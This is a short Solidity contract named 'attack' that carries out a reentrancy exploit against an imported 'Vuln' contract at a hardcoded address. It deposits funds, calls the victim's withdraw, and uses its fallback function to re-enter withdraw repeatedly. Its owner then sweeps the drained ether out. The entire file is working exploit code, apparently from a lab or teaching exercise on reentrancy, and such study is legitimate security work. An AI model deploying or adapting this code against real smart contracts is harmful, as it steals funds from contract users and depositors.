pragma solidity ^0.5.0;
import './vuln.sol';

contract attack{
    //create address for owner
    address own;
    constructor() public{
        own = msg.sender;
    }
    
    function deposit() public payable {}
    
    //create test object for Vulnerable contract
    address public test = address(0x649A4bd91068077e1D7C9Ddf389a445234801794);
    
    //Ensure that we are the only ones using the contract
    modifier req_own(){
        require(msg.sender == own);
        _;
    }

    Vuln vuln = Vuln(address(0x649A4bd91068077e1D7C9Ddf389a445234801794));
    function send_to() public{
        vuln.deposit.value(address(this).balance)();
    }
    
    uint counter;

    function steal() public
    {
        counter = 0;
        vuln.withdraw();
    }
    //recursive call to vulnerable withdraw from fallback function
    function () external payable{
        if(address(vuln).balance >= msg.value && counter < 2)
        {
            counter++;
            vuln.withdraw();
        }
    }
    
    function withdraw() req_own() public {
        msg.sender.transfer(address(this).balance);
    }
}